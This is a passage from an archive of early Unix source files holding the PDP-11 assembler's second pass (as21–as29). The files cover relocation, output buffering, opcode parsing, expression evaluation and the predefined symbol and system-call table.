	bvs	1f
	add	$14,symsiz		/ count symbols
	jsr	pc,getw
	jsr	pc,getw
	jsr	pc,getw
	jsr	pc,getw
	mov	r4,r0
	bic	$!37,r0
	cmp	r0,$2			/text
	blo	2f
	cmp	r0,$3			/data
	bhi	2f
	add	$31,r4			/mark "estimated"
	mov	r4,(r1)+
	jsr	pc,getw
	mov	r4,(r1)+
	br	3f
2:
	clr	(r1)+
	clr	(r1)+
	jsr	pc,getw
3:
	jsr	pc,setbrk
	br	1b
1:

/ read in f-b definitions

	mov	r1,fbbufp
	movb	fbfil,fin
	clr	ibufc
1:
	jsr	pc,getw
	bvs	1f
	add	$31,r4			/ "estimated"
	mov	r4,(r1)+
	jsr	pc,getw
	mov	r4,(r1)+
	jsr	pc,setbrk
	br	1b
1:
	mov	r1,endtable
	mov	$100000,(r1)+

/ set up input text file; initialize f-b table

	jsr	pc,setup
/ do pass 1

	jsr	pc,assem

/ prepare for pass 2
	cmp	outmod,$777
	beq	1f
	jmp	aexit
1:
	clr	dot
	mov	$2,dotrel
	mov	$..,dotdot
	clr	brtabp
	movb	fin,r0
	sys	close
	jsr	r5,ofile; a.tmp1
	movb	r0,fin
	clr	ibufc
	jsr	pc,setup
	inc	passno
	inc	bsssiz
	bic	$1,bsssiz
	mov	txtsiz,r1
	inc	r1
	bic	$1,r1
	mov	r1,txtsiz
	mov	datsiz,r2
	inc	r2
	bic	$1,r2
	mov	r2,datsiz
	mov	r1,r3
	mov	r3,datbase	/ txtsiz
	mov	r3,savdot+2
	add	r2,r3
	mov	r3,bssbase	/ txtsiz+datsiz
	mov	r3,savdot+4
	asl	r3
	add	$20,r3
	mov	r3,symseek	/ 2*txtsiz+2*datsiz+20
	sub	r2,r3
	mov	r3,drelseek	/ 2*txtsiz+datsiz
	sub	r1,r3
	mov	r3,trelseek	/ txtsiz+datsiz+20
	sub	r2,r3
	mov	r3,datseek	/ txtsiz+20
	mov	$usymtab,r1
1:
	jsr	pc,doreloc
	add	$4,r1
	cmp	r1,endtable
	blo	1b
	clr	r0
	jsr	r5,oset; txtp
	mov	trelseek,r0
	jsr	r5,oset; relp
	mov	$8.,r2
	mov	$txtmagic,r1
1:
	mov	(r1)+,r0
	jsr	r5,putw; txtp
	dec	r2
	bne	1b
	jsr	pc,assem

/polish off text and relocation

	jsr	r5,flush; txtp
	jsr	r5,flush; relp

/ append full symbol table

	mov	symf,r0
	mov	r0,fin
	sys	seek; 0; 0;
	clr	ibufc
	mov	symseek,r0
	jsr	r5,oset; txtp
	mov	$usymtab,r1
1:
	jsr	pc,getw
	bvs	1f
	mov	r4,r0
	jsr	r5,putw; txtp
	jsr	pc,getw
	mov	r4,r0
	jsr	r5,putw; txtp
	jsr	pc,getw
	mov	r4,r0
	jsr	r5,putw; txtp
	jsr	pc,getw
	mov	r4,r0
	jsr	r5,putw; txtp
	mov	(r1)+,r0
	jsr	r5,putw; txtp
	mov	(r1)+,r0
	jsr	r5,putw; txtp
	jsr	pc,getw
	jsr	pc,getw
	br	1b
1:
	jsr	r5,flush; txtp
	jmp	aexit

	.data
aexit:
	mov	a.tmp1,0f
	sys	unlink; 0:..
	mov	a.tmp2,0f
	sys	unlink; 0:..
	mov	a.tmp3,0f
	sys	unlink; 0:..
	sys	chmod; a.out; outmod: 777
	sys	exit
	.text

filerr:
	mov	*(r5),r5
1:
	movb	(r5)+,ch
	beq	1f
	mov	$1,r0
	sys	write; ch; 1
	br	1b
1:
	mov	$1,r0
	sys	write; qnl; 2
	jmp	aexit

doreloc:
	movb	(r1),r0
	bne	1f
	bisb	defund,(r1)
1:
	bic	$!37,r0
	cmp	r0,$5
	bhis	1f
	cmp	r0,$3
	blo	1f
	beq	2f
	add	bssbase,2(r1)
	rts	pc
2:
	add	datbase,2(r1)
1:
	rts	pc

setbrk:
	mov	r1,-(sp)
	add	$20,r1
	cmp	r1,0f
	blo	1f
	add	$512.,0f
	sys	indir; 9f
	.data
9:	sys	break; 0: end
	.text
1:
	mov	(sp)+,r1
	rts	pc

setup:
	mov	$curfb,r4
1:
	clr	(r4)+
	cmp	r4,$curfb+40.
	blo	1b
	mov	txtfil,fin
	clr	ibufc
	clr	r4
1:
	jsr	pc,fbadv
	tstb	(r4)+
	cmp	r4,$10.
	blt	1b
	rts	pc

ofile:
	mov	*(r5),0f
	sys	indir; 9f
	.data
9:	sys	open; 0:..; 0
	.text
	bes	1f
	tst	(r5)+
	rts	r5
1:
	jmp	filerr
-- /usr/source/as/as22.s mode=0100664 uid=3 gid=3 atime=174920363 mtime=174844111 --
/
/

/ a2 -- pdp-11 assembler pass 2

outw:
	cmp	dot-2,$4
	beq	9f
	bit	$1,dot
	bne	1f
	add	$2,dot
	tstb	passno
	beq	8f
	clr	-(sp)
	rol	r3
	adc	(sp)
	asr	r3		/ get relative pc bit
	cmp	r3,$40
	bne	2f
/ external references
	mov	$666,outmod		/ make nonexecutable
	mov	xsymbol,r3
	sub	$usymtab,r3
	asl	r3
	bis	$4,r3		/ external relocation
	br	3f
2:
	bic	$40,r3		/ clear any ext bits
	cmp	r3,$5
	blo	4f
	cmp	r3,$33		/ est. text, data
	beq	6f
	cmp	r3,$34
	bne	7f
6:
	jsr	r5,error; 'r
7:
	mov	$1,r3		/ make absolute
4:
	cmp	r3,$2
	blo	5f
	cmp	r3,$4
	bhi	5f
	tst	(sp)
	bne	4f
	add	dotdot,r2
	br	4f
5:
	tst	(sp)
	beq	4f
	sub	dotdot,r2
4:
	dec	r3
	bpl	3f
	clr	r3
3:
	asl	r3
	bis	(sp)+,r3
	mov	r2,r0
	jsr	r5,putw; txtp
	add	$2,*tseekp
	mov	r3,r0
	jsr	r5,putw; relp
	add	$2,*rseekp
8:
	rts	pc
1:
	jsr	r5,error; 'o
	clr	r3
	jsr	pc,outb
	rts	pc

9:
	jsr	r5,error; 'x
	rts	pc

outb:
	cmp	dot-2,$4		/ test bss mode
	beq	9b
	cmp	r3,$1
	blos	1f
	jsr	r5,error; 'r
1:
	tstb	passno
	beq	2f
	mov	r2,r0
	bit	$1,dot
	bne	1f
	jsr	r5,putw; txtp
	clr	r0
	jsr	r5,putw; relp
	add	$2,*rseekp
	add	$2,*tseekp
	br	2f
1:
	mov	txtp,r0
	movb	r2,-1(r0)
2:
	inc	dot
	rts	pc

error:
	mov	$666,outmod		/ make nonexecutable
	mov	r3,-(sp)
	mov	r2,-(sp)
	mov	r1,-(sp)
	mov	r0,-(sp)
	mov	$argb,r1
1:
	movb	(r1),ch
	beq	1f
	clrb	(r1)+
	mov	$1,r0
	sys	write; ch; 1
	br	1b
1:
	mov	(r5)+,r0
	movb	r0,0f
	mov	line,r3
	mov	$0f+6,r0
	mov	$4,r1
2:
	clr	r2
	dvd	$10.,r2
	add	$'0,r3
	movb	r3,-(r0)
	mov	r2,r3
	sob	r1,2b
	mov	$1,r0
	sys	write; 0f; 7
	mov	(sp)+,r0
	mov	(sp)+,r1
	mov	(sp)+,r2
	mov	(sp)+,r3
	rts	r5

	.data
0:	<f xxxx\n>
	.even
	.text

betwen:
	cmp	r0,(r5)+
	blt	1f
	cmp	(r5)+,r0
	blt	2f
1:
	tst	(r5)+
2:
	rts	r5

-- /usr/source/as/as23.s mode=0100664 uid=3 gid=3 atime=174920364 mtime=174844115 --
/
/

/ a3 -- pdp-11 assembler pass 2

assem:
	jsr	pc,readop
	cmp	r4,$5
	beq	2f
	cmp	r4,$'<
	beq	2f
	jsr	pc,checkeos
		br eal1
	mov	r4,-(sp)
	cmp	(sp),$1
	bne	1f
	mov	$2,(sp)
	jsr	pc,getw
	mov	r4,numval
1:
	jsr	pc,readop
	cmp	r4,$'=
	beq	4f
	cmp	r4,$':
	beq	1f
	mov	r4,savop
	mov	(sp)+,r4
2:
	jsr	pc,opline
dotmax:
	tstb	passno
	bne	eal1
	movb	dotrel,r0
	asl	r0
	cmp	dot,txtsiz-4(r0)
	blos	ealoop
	mov	dot,txtsiz-4(r0)
eal1:
	jmp	ealoop
1:
	mov	(sp)+,r4
	cmp	r4,$200
	bhis	1f
	cmp	r4,$2
	beq	3f
	jsr	r5,error; 'x
	br	assem
1:
	tstb	passno
	bne	2f
	movb	(r4),r0
	bic	$!37,r0
	beq	5f
	cmp	r0,$33
	blt	6f
	cmp	r0,$34
	ble	5f
6:
	jsr	r5,error; 'm
5:
	bic	$37,(r4)
	bis	dotrel,(r4)
	mov	2(r4),brdelt
	sub	dot,brdelt
	mov	dot,2(r4)
	br	assem
2:
	cmp	dot,2(r4)
	beq	assem
	jsr	r5,error; 'p
	br	assem
3:
	mov	numval,r4
	jsr	pc,fbadv
	asl	r4
	mov	curfb(r4),r0
	movb	dotrel,(r0)
	mov	2(r0),brdelt
	sub	dot,brdelt
	mov	dot,2(r0)
	br	assem
4:
	jsr	pc,readop
	jsr	pc,expres
	mov	(sp)+,r1
	cmp	r1,$symtab	/test for dot
	bne	1f
	bic	$40,r3
	cmp	r3,dotrel	/ can't change relocation
	bne	2f
	cmp	r3,$4		/ bss
	bne	3f
	mov	r2,dot
	br	dotmax
3:
	sub	dot,r2
	bmi	2f
	mov	r2,-(sp)
3:
	dec	(sp)
	bmi	3f
	clr	r2
	mov	$1,r3
	jsr	pc,outb
	br	3b
3:
	tst	(sp)+
	br	dotmax
2:
	jsr	r5,error; '.
	br	ealoop
1:
	cmp	r3,$40
	bne	1f
	jsr	r5,error; 'r
1:
	bic	$37,(r1)
	bic	$!37,r3
	bne	1f
	clr	r2
1:
	bisb	r3,(r1)
	mov	r2,2(r1)

ealoop:
	cmp	r4,$'\n
	beq	1f
	cmp	r4,$'\e
	bne	9f
	rts	pc
1:
	inc	line
9:
	jmp	assem

checkeos:
	cmp	r4,$'\n
	beq	1f
	cmp	r4,$';
	beq	1f
	cmp	r4,$'\e
	beq	1f
	add	$2,(sp)
1:
	rts	pc

fbadv:
	asl	r4
	mov	nxtfb(r4),r1
	mov	r1,curfb(r4)
	bne	1f
	mov	fbbufp,r1
	br	2f
1:
	add	$4,r1
2:
	cmpb	1(r1),r4
	beq	1f
	tst	(r1)
	bpl	1b
1:
	mov	r1,nxtfb(r4)
	asr	r4
	rts	pc

-- /usr/source/as/as24.s mode=0100664 uid=3 gid=3 atime=174920364 mtime=174844119 --
/
/

/ a4 -- pdp-11 assembler pass 2

oset:
	mov	r2,-(sp)
	mov	(r5)+,r1
	mov	r0,r2
	bic	$!777,r0
	add	r1,r0
	add	$6,r0
	mov	r0,(r1)+	/ next slot
	mov	r1,r0
	add	$1004,r0
	mov	r0,(r1)+	/ buf max
	mov	r2,(r1)+	/ seek addr
	mov	(sp)+,r2
	rts	r5

putw:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	(r5)+,r2
	mov	(r2)+,r1	/ slot
	cmp	r1,(r2)		/ buf max
	bhis	1f
	mov	r0,(r1)+
	mov	r1,-(r2)
	br	2f
1:
	tst	(r2)+
	mov	r0,-(sp)
	jsr	r5,flush1
	mov	(sp)+,r0
	mov	r0,*(r2)+
	add	$2,-(r2)
2:
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	r5

flush:
	mov	(r5)+,r2
	cmp	(r2)+,(r2)+
flush1:
	mov	(r2)+,r1
	mov	r1,0f		/ seek address
	mov	fout,r0
	sys	indir; 9f
	.data
9:	sys	seek; 0:..; 0
	.text
	bic	$!777,r1
	add	r2,r1		/ write address
	mov	r1,0f
	mov	r2,r0
	bis	$777,-(r2)
	inc	(r2)		/ new seek addr
	cmp	-(r2),-(r2)
	sub	(r2),r1
	neg	r1
	mov	r1,0f+2		/ count
	mov	r0,(r2)		/ new next slot
	mov	fout,r0
	sys	indir; 9f
	.data
9:	sys	write; 0:..; ..
	.text
	rts	r5

readop:
	mov	savop,r4
	beq	1f
	clr	savop
	rts	pc
1:
	jsr	pc,getw1
	cmp	r4,$200
	blo	1f
	cmp	r4,$4000
	blo	2f
	add	$usymtab-4000,r4
	rts	pc
2:
	add	$symtab-1000,r4
1:
	rts	pc

getw:
	mov	savop,r4
	beq	getw1
	clr	savop
	rts	pc
getw1:
	dec	ibufc
	bgt	1f
	movb	fin,r0
	sys	read; inbuf; 512.
	bes	3f
	asr	r0
	mov	r0,ibufc
	bne	2f
3:
	mov	$4,r4
	sev
	rts	pc
2:
	mov	$inbuf,ibufp
1:
	mov	*ibufp,r4
	add	$2,ibufp
	rts	pc
-- /usr/source/as/as25.s mode=0100664 uid=3 gid=3 atime=174920364 mtime=174844124 --
/
/

/ as25 is empty
-- /usr/source/as/as26.s mode=0110664 uid=3 gid=3 atime=174920364 mtime=174844130 --
/
/

/ a6 -- pdp-11 assembler pass 2

opline:
	mov	r4,r0
	jsr	r5,betwen; 0; 177
		br 2f
	cmp	r4,$5
	beq	opeof
	cmp	r4,$'<
	bne	xpr
	jmp	opl17
xxpr:
	tst	(sp)+
xpr:
	jsr	pc,expres
	jsr	pc,outw
	rts	pc
2:
	movb	(r4),r0
	cmp	r0,$24		/reg
	beq	xpr
	cmp	r0,$33		/est text
	beq	xpr
	cmp	r0,$34		/ est data
	beq	xpr
	jsr	r5,betwen; 5; 36
		br xpr
	mov	2(r4),-(sp)
	mov	r0,-(sp)
	jsr	pc,readop
	mov	(sp)+,r0
	asl	r0
	mov	$adrbuf,r5
	clr	swapf
	mov	$-1,rlimit
	jmp	*1f-10.(r0)

1:
	opl5
	opl6
	opl7
	opl10
	opl11
	opl12
	opl13
	opl14
	opl15
	opl16
	opl17
	opl20
	opl21
	opl22
	opl23
	xxpr
	opl25
	opl26
	opl27
	opl30
	opl31
	opl32
	xxpr
	xxpr
	opl35
	opl36

opeof:
	mov	$1,line
	mov	$20,-(sp)
	mov	$argb,r1
1:
	jsr	pc,getw
	tst	r4
	bmi	1f
	movb	r4,(r1)+
	dec	(sp)
	bgt	1b
	tstb	-(r1)
	br	1b
1:
	movb	$'\n,(r1)+
	clrb	(r1)+
	tst	(sp)+
	rts	pc

opl30:	/ mpy, dvd etc
	inc	swapf
	mov	$1000,rlimit
	br	opl13

opl14:		/ flop freg,fsrc
	inc	swapf

opl5:		/ flop src,freg
	mov	$400,rlimit

/double
opl13:
	jsr	pc,addres
op2a:
	mov	r2,-(sp)
	jsr	pc,readop
op2b:
	jsr	pc,addres
	tst	swapf
	beq	1f
	mov	(sp),r0
	mov	r2,(sp)
	mov	r0,r2
1:
	swab	(sp)
	asr	(sp)
	asr	(sp)
	cmp	(sp),rlimit
	blo	1f
	jsr	r5,error; 'x
1:
	bis	(sp)+,r2
	bis	(sp)+,r2
	clr	r3
	jsr	pc,outw
	mov	$adrbuf,r1
1:
	cmp	r1,r5
	bhis	1f
	mov	(r1)+,r2
	mov	(r1)+,r3
	mov	(r1)+,xsymbol
	jsr	pc,outw
	br	1b
1:
	rts	pc

opl15:		/ single operand
	clr	-(sp)
	br	op2b

opl12:		/ movf
	mov	$400,rlimit
	jsr	pc,addres
	cmp	r2,$4		/ see if source is fregister
	blo	1f
	inc	swapf
	br	op2a
1:
	mov	$174000,(sp)
	br	op2a

/ jbr
opl35:
/ jeq, jne, etc
opl36:
	jsr	pc,expres
	tstb	passno
	bne	1f
	mov	r2,r0
	jsr	pc,setbr
	tst	r2
	beq	2f
	cmp	(sp),$br
	beq	2f
	add	$2,r2
2:
	add	r2,dot		/ if doesn't fit
	add	$2,dot
	tst	(sp)+
	rts	pc
1:
	jsr	pc,getbr
	bcc	dobranch
	mov	(sp)+,r0
	mov	r2,-(sp)
	mov	r3,-(sp)
	cmp	r0,$br
	beq	2f
	mov	$402,r2
	xor	r0,r2		/ flip cond, add ".+6"
	mov	$1,r3
	jsr	pc,outw
2:
	mov	$1,r3
	mov	$jmp+37,r2
	jsr	pc,outw
	mov	(sp)+,r3
	mov	(sp)+,r2
	jsr	pc,outw
	rts	pc

/sob
opl31:	/ sob
	jsr	pc,expres
	jsr	pc,checkreg
	swab	r2
	asr	r2
	asr	r2
	bis	r2,(sp)
	jsr	pc,readop
	jsr	pc,expres
	tstb	passno
	beq	3f
	sub	dot,r2
	neg	r2
	mov	r2,r0
	jsr	r5,betwen; -2; 175
		br 2f
	add	$4,r2
	br	1f

/branch
opl6:
	jsr	pc,expres
	tstb	passno
	beq	3f
dobranch:
	sub	dot,r2
	mov	r2,r0
	jsr	r5,betwen; -254.; 256.
		br 2f
1:
	bit	$1,r2
	bne	2f
	cmp	r3,dot-2	/ same relocation as .
	bne	2f
	asr	r2
	dec	r2
	bic	$177400,r2
3:
	bis	(sp)+,r2
	clr	r3
	jsr	pc,outw
	rts	pc
2:
	jsr	r5,error; 'b
	clr	r2
	br	3b

/jsr
opl7:
	jsr	pc,expres
	jsr	pc,checkreg
	jmp	op2a

/ rts
opl10:
	jsr	pc,expres
	jsr	pc,checkreg
	br	1f

/ sys, emt etc
opl11:
	jsr	pc,expres
	cmp	r2,$64.
	bhis	0f
	cmp	r3,$1
	ble	1f
0:
	jsr	pc,errora
1:
	bis	(sp)+,r2
	jsr	pc,outw
	rts	pc

/ .byte
opl16:
	jsr	pc,expres
	jsr	pc,outb
	cmp	r4,$',
	bne	1f
	jsr	pc,readop
	br	opl16
1:
	tst	(sp)+
	rts	pc

/ < (.ascii)
opl17:
	jsr	pc,getw
	mov	$1,r3
	mov	r4,r2
	bmi	2f
	bic	$!377,r2
	jsr	pc,outb
	br	opl17
2:
	jsr	pc,getw
	rts	pc

/.even
opl20:
	bit	$1,dot
	beq	1f
	cmp	dot-2,$4
	beq	2f		/ bss mode
	clr	r2
	clr	r3
	jsr	pc,outb
	br	1f
2:
	inc	dot
1:
	tst	(sp)+
	rts	pc
opl21:	/if
	jsr	pc,expres
opl22:
oplret:
	tst	(sp)+
	rts	pc


/.globl
opl23:
	cmp	r4,$200
	blo	1f
	bisb	$40,(r4)
	jsr	pc,readop
	cmp	r4,$',
	bne	1f
	jsr	pc,readop
	br	opl23
1:
	tst	(sp)+
	rts	pc

/ .text, .data, .bss
opl25:
opl26:
opl27:
	inc	dot
	bic	$1,dot
	mov	r0,-(sp)
	mov	dot-2,r1
	asl	r1
	mov	dot,savdot-4(r1)
	tstb	passno
	beq	1f
	jsr	r5,flush; txtp
	jsr	r5,flush; relp
	mov	(sp),r2
	add	$txtseek-[2*25],r2
	mov	r2,tseekp
	mov	(r2),r0
	jsr	r5,oset; txtp
	add	$trelseek-txtseek,r2
	mov	(r2),r0
	mov	r2,rseekp
	jsr	r5,oset; relp
1:
	mov	(sp)+,r0
	mov	savdot-[2*25](r0),dot
	asr	r0
	sub	$25-2,r0
	mov	r0,dot-2	/ new . relocation
	tst	(sp)+
	rts	pc

opl32:
	cmp	r4,$200
	blo	1f
	mov	r4,-(sp)
	jsr	pc,readop
	jsr	pc,readop
	jsr	pc,expres
	mov	(sp)+,r0
	bit	$37,(r0)
	bne	1f
	bis	$40,(r0)
	mov	r2,2(r0)
1:
	tst	(sp)+
	rts	pc

addres:
	clr	-(sp)
4:
	cmp	r4,$'(
	beq	alp
	cmp	r4,$'-
	beq	amin
	cmp	r4,$'$
	beq	adoll
	cmp	r4,$'*
	bne	getx
	jmp	astar
getx:
	jsr	pc,expres
	cmp	r4,$'(
	bne	2f
	jsr	pc,readop
	mov	r2,(r5)+
	mov	r3,(r5)+
	mov	xsymbol,(r5)+
	jsr	pc,expres
	jsr	pc,checkreg
	jsr	pc,checkrp
	bis	$60,r2
	bis	(sp)+,r2
	rts	pc

2:
	cmp	r3,$24
	bne	1f
	jsr	pc,checkreg
	bis	(sp)+,r2
	rts	pc
1:
	mov	r3,-(sp)
	bic	$40,r3
	mov	(sp)+,r3
	bis	$100000,r3
	sub	dot,r2
	sub	$4,r2
	cmp	r5,$adrbuf
	beq	1f
	sub	$2,r2
1:
	mov	r2,(r5)+		/ index
	mov	r3,(r5)+		/ index reloc.
	mov	xsymbol,(r5)+		/ index global
	mov	$67,r2			/ address mode
	bis	(sp)+,r2
	rts	pc

alp:
	jsr	pc,readop
	jsr	pc,expres
	jsr	pc,checkrp
	jsr	pc,checkreg
	cmp	r4,$'+
	beq	1f
	tst	(sp)+
	beq	2f
	bis	$70,r2
	clr	(r5)+
	clr	(r5)+
	mov	xsymbol,(r5)+
	rts	pc
2:
	bis	$10,r2
	rts	pc
1:
	jsr	pc,readop
	bis	$20,r2
	bis	(sp)+,r2
	rts	pc

amin:
	jsr	pc,readop
	cmp	r4,$'(
	beq	1f
	mov	r4,savop
	mov	$'-,r4
	br	getx
1:
	jsr	pc,readop
	jsr	pc,expres
	jsr	pc,checkrp
	jsr	pc,checkreg
	bis	(sp)+,r2
	bis	$40,r2
	rts	pc

adoll:
	jsr	pc,readop
	jsr	pc,expres
	mov	r2,(r5)+
	mov	r3,(r5)+
	mov	xsymbol,(r5)+
	mov	(sp)+,r2
	bis	$27,r2
	rts	pc

astar:
	tst	(sp)
	beq	1f
	jsr	r5,error; '*
1:
	mov	$10,(sp)
	jsr	pc,readop
	jmp	4b

errora:
	jsr	r5,error; 'a
	rts	pc

checkreg:
	cmp	r2,$7
	bhi	1f
	cmp	r1,$1
	blos	2f
	cmp	r3,$5
	blo	1f
2:
	rts	pc
1:
	jsr	pc,errora
	clr	r2
	clr	r3
	rts	pc

errore:
	jsr	r5,error; 'e
	rts	pc

checkrp:
	cmp	r4,$')
	beq	1f
	jsr	r5,error; ')
	rts	pc
1:
	jsr	pc,readop
	rts	pc

setbr:
	mov	brtabp,r1
	cmp	r1,$brlen
	blt	1f
	mov	$2,r2
	rts	pc
1:
	inc	brtabp
	clr	-(sp)
	sub	dot,r0
	ble	1f
	sub	brdelt,r0
1:
	jsr	r5,betwen; -254.; 256.
		br 1f
	br	2f
1:
	mov	r1,-(sp)
	bic	$!7,(sp)
	mov	$1,r0
	ash	(sp)+,r0
	ash	$-3,r1
	bisb	r0,brtab(r1)
	mov	$2,(sp)
2:
	mov	(sp)+,r2
	rts	pc

getbr:
	mov	brtabp,r1
	cmp	r1,$brlen
	blt	1f
	sec
	rts	pc
1:
	mov	r1,-(sp)
	bic	$!7,(sp)
	neg	(sp)
	inc	brtabp
	ash	$-3,r1
	movb	brtab(r1),r1
	ash	(sp)+,r1
	ror	r1		/ 0-bit into c-bit
	rts	pc
-- /usr/source/as/as27.s mode=0100664 uid=3 gid=3 atime=174920365 mtime=174844134 --
/
/

/  a7 -- pdp-11 assembler

expres:
	clr	xsymbol
expres1:
	mov	r5,-(sp)
	mov	$'+,-(sp)
	clr	r2
	mov	$1,r3
	br	1f
advanc:
	jsr	pc,readop
1:
	mov	r4,r0
	jsr	r5,betwen; 0; 177
		br .+4
	br	7f
	movb	(r4),r0
	tst	r0
	bne	1f
	tstb	passno
	beq	1f
	jsr	r5,error; 'u
1:
	cmp	r0,$40
	bne	1f
	mov	r4,xsymbol
	clr	r1
	br	oprand
1:
	mov	2(r4),r1
	br	oprand
7:
	cmp	r4,$141
	blo	1f
	asl	r4
	mov	curfb-[2*141](r4),r0
	mov	2(r0),r1
	movb	(r0),r0
	br	oprand
1:
	mov	$esw1,r1
1:
	cmp	(r1)+,r4
	beq	1f
	tst	(r1)+
	bne	1b
	tst	(sp)+
	mov	(sp)+,r5
	rts	pc
1:
	jmp	*(r1)

esw1:
	'+;	binop
	'-;	binop
	'*;	binop
	'/;	binop
	'&;	binop
	037;	binop
	035;	binop
	036;	binop
	'%;	binop
	'[;	brack
	'^;	binop
	1;	exnum
	2;	exnum1
	'!;	binop
	200;	0

binop:
	cmpb	(sp),$'+
	beq	1f
	jsr	pc,errore
1:
	movb	r4,(sp)
	br	advanc

exnum1:
	mov	numval,r1
	br	1f

exnum:
	jsr	pc,getw
	mov	r4,r1
1:
	mov	$1,r0
	br	oprand

brack:
	mov	r2,-(sp)
	mov	r3,-(sp)
	jsr	pc,readop
	jsr	pc,expres1
	cmp	r4,$']
	beq	1f
	jsr	r5,error; ']
1:
	mov	r3,r0
	mov	r2,r1
	mov	(sp)+,r3
	mov	(sp)+,r2

oprand:
	mov	$exsw2,r5
1:
	cmp	(sp),(r5)+
	beq	1f
	tst	(r5)+
	bne	1b
	br	eoprnd
1:
	jmp	*(r5)

exsw2:
	'+; exadd
	'-; exsub
	'*; exmul
	'/; exdiv
	037; exor
	'&; exand
	035;exlsh
	036;exrsh
	'%; exmod
	'^; excmbin
	'!; exnot
	200;  0

excmbin:
	mov	r0,r3
	br	eoprnd

exrsh:
	neg	r1
	beq	exlsh
	inc	r1
	clc
	ror	r2
exlsh:
	jsr	r5,combin; relte2
	als	r1,r2
	br	eoprnd

exmod:
	jsr	r5,combin; relte2
	mov	r3,r0
	mov	r2,r3
	clr	r2
	dvd	r1,r2
	mov	r3,r2
	mov	r0,r3
	br	eoprnd

exadd:
	jsr	r5,combin; reltp2
	add	r1,r2
	br	eoprnd

exsub:
	jsr	r5,combin; reltm2
	sub	r1,r2
	br	eoprnd

exand:
	jsr	r5,combin; relte2
	com	r1
	bic	r1,r2
	br	eoprnd

exor:
	jsr	r5,combin; relte2
	bis	r1,r2
	br	eoprnd

exmul:
	jsr	r5,combin; relte2
	mpy	r2,r1
	mov	r1,r2
	br	eoprnd

exdiv:
	jsr	r5,combin; relte2
	mov	r3,r0
	mov	r2,r3
	clr	r2
	dvd	r1,r2
	mov	r0,r3
	br	eoprnd

exnot:
	jsr	r5,combin; relte2
	com	r1
	add	r1,r2
	br	eoprnd

eoprnd:
	mov	$'+,(sp)
	jmp	advanc

combin:
	tstb	passno
	bne	combin1
	mov	r0,-(sp)
	bis	r3,(sp)
	bic	$!40,(sp)
	bic	$!37,r0
	bic	$!37,r3
	cmp	r0,r3
	ble	1f
	mov	r0,-(sp)
	mov	r3,r0
	mov	(sp)+,r3
1:
	tst	r0
	beq	1f
	cmp	(r5)+,$reltm2
	bne	2f
	cmp	r0,r3
	bne	2f
	mov	$1,r3
	br	2f
1:
	tst	(r5)+
	clr	r3
2:
	bis	(sp)+,r3
	rts	r5
combin1:
	mov	r1,-(sp)
	clr	maxtyp
	jsr	pc,maprel
	mov	r0,r1
	mpy	$6,r1
	mov	r3,r0
	jsr	pc,maprel
	add	(r5)+,r0
	add	r1,r0
	movb	(r0),r3
	bpl	1f
	cmp	r3,$-1
	beq	2f
	jsr	r5,error; 'r
2:
	mov	maxtyp,r3
1:
	mov	(sp)+,r1
	rts	r5

maprel:
	cmp	r0,$40
	bne	1f
	mov	$5,r0
	rts	pc
1:
	bic	$!37,r0
	cmp	r0,maxtyp
	blos	1f
	mov	r0,maxtyp
1:
	cmp	r0,$5
	blos	1f
	mov	$1,r0
1:
	rts	pc

X = -2
M = -1
reltp2:
	.byte 0, 0, 0, 0, 0, 0
	.byte 0, M, 2, 3, 4,40
	.byte 0, 2, X, X, X, X
	.byte 0, 3, X, X, X, X
	.byte 0, 4, X, X, X, X
	.byte 0,40, X, X, X, X

reltm2:
	.byte 0, 0, 0, 0, 0, 0
	.byte 0, M, 2, 3, 4,40
	.byte 0, X, 1, X, X, X
	.byte 0, X, X, 1, X, X
	.byte 0, X, X, X, 1, X
	.byte 0, X, X, X, X, X

relte2:
	.byte 0, 0, 0, 0, 0, 0
	.byte 0, M, X, X, X, X
	.byte 0, X, X, X, X, X
	.byte 0, X, X, X, X, X
	.byte 0, X, X, X, X, X
	.byte 0, X, X, X, X, X

-- /usr/source/as/as28.s mode=0100664 uid=3 gid=3 atime=174920365 mtime=174844139 --
/
/

/ as8 -- PDP-11 assembler pass 2

qnl:	<?\n>
a.out:	<a.out\0>

.even
a.outp:	a.out

	.data
a.tmp1:	0
a.tmp2:	0
a.tmp3:	0

tseekp:	txtseek
rseekp:	trelseek

txtmagic:
	br	.+20
txtsiz:	.=.+2
datsiz:	.=.+2
bsssiz:	.=.+2
symsiz:	.=.+2
stksiz:	.=.+2
exorig:	.=.+2
	.=.+2

txtseek: 20
datseek:.=.+2
	.=.+2
trelseek:.=.+2
drelseek:.=.+2
	.=.+2
symseek:.=.+2

.bss

brlen	= 1024.
brtab:	.=.+[brlen\/8.]
brtabp:	.=.+2
brdelt:	.=.+2
fbbufp:	.=.+2
defund:	.=.+2
savdot:	.=.+6
datbase:.=.+2
bssbase:.=.+2
fbfil:	.=.+2
fin:	.=.+2
ibufc:	.=.+2
txtfil:	.=.+2
symf:	.=.+2
adrbuf:	.=.+12.
xsymbol:.=.+2
fout:	.=.+2
ch:	.=.+2
wordf:	.=.+2
argb:	.=.+22.
line:	.=.+2
savop:	.=.+2
curfb:	.=.+20.
nxtfb:	.=.+20.
numval:	.=.+2
maxtyp:	.=.+2
relfil:	.=.+2
ibufp:	.=.+2
txtp:	.=.+6+512.
relp:	.=.+6+512.
swapf:	.=.+2
rlimit:	.=.+2
passno:	.=.+2
endtable:.=.+2
usymtab:.=.+20.
end:

.text
-- /usr/source/as/as29.s mode=0100664 uid=3 gid=3 atime=174920365 mtime=174844145 --
/
/

/ as9 -- PDP-11 assembler pass 2

eae = 0

	.data
symtab:

/ special variables

dotrel: 02; dot:000000 /.
 01; dotdot:000000 /..

/ register

24;000000 /r0
24;000001 /r1
24;000002 /r2
24;000003 /r3
24;000004 /r4
24;000005 /r5
24;000006 /sp
24;000007 /pc


.if eae
/eae & switches

01;177570 /csw
01;177300 /div
01;177302 /ac
01;177304 /mq
01;177306 /mul
01;177310 /sc
01;177311 /sr
01;177312 /nor
01;177314 /lsh
01;177316 /ash

.endif

/ system calls

01;0000001 /exit
01;0000002 /fork
01;0000003 /read
01;0000004 /write
01;0000005 /open
01;0000006 /close
01;0000007 /wait
01;0000010 /creat
01;0000011 /link
01;0000012 /unlink
01;0000013 /exec
01;0000014 /chdir
01;0000015 /time
01;0000016 /makdir
01;0000017 /chmod
01;0000020 /chown
01;0000021 /break
01;0000022 /stat
01;0000023 /seek
01;0000024 /tell
01;0000025 /mount
01;0000026 /umount
01;0000027 /setuid
